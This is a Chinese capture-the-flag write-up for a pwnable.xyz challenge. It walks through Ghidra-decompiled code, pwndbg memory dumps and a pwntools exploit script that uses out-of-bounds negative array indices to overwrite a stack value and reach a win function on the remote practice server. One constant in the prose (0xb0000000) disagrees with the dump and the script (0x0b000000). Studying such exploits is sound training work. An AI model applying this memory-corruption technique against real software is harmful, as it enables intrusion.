用ghidra查看代码
```c
undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  undefined local_a8 [8];
  undefined auStack160 [24];
  long local_88;
  long local_80;
  long local_78 [13];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  memset(local_a8,0,0x98);
  auStack160._7_8_ = 0xdeadbeef;                // B
  while( true ) {
    iVar1 = __isoc99_scanf("%ld %ld %ld",&local_88,&local_80,local_78);
    if (((iVar1 != 3) || (9 < local_78[0])) || (local_78[0] < -7)) break;
    *(long *)(auStack160 + (local_78[0] + 6) * 8) = local_80 + local_88;
    printf("Result: %ld\n",*(undefined8 *)(auStack160 + (local_78[0] + 6) * 8));
  }
  if (auStack160._7_8_ == 0xb000000b5) {         // A
    win();
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

A行可翻译为：
```
*(long *)((char *) auStack160 + 15) == 0xb000000b5
```

结合B行，内存中的值为

`pwndbg> x/16bx $rbp-160+8`
0x7fffffffe3d8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0xef
0x7fffffffe3e0: 0xbe    0xad    0xde    0x00    0x00    0x00    0x00    0x00

*注：0x7fffffffe3d8: 为auStack160的开始位置*



需要修改成:
0x7fffffffe3d8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    <span style="color:red">0xb5</span>
0x7fffffffe3e0: <span style="color:red">0x00    0x00    0x00    0x0b</span>    0x00    0x00    0x00    0x00


即
```
*(long *)((char *) auStack160 + 0) == 0xb500000000000000
*(long *)((char *) auStack160 + 8) == 0xb0000000
```



脚本
```python
from pwn import *
from ctypes import *


p = remote('svc.pwnable.xyz', 30003)
# p = process('./challenge')
p.sendline(str.encode(str(c_int64(0xb500000000000000).value)) + b' 0 -6')
p.recvline()
p.sendline(str.encode(str(c_int64(0xb000000).value)) + b' 0 -5')
p.recvline()
p.sendline(b'e')
p.interactive()
```
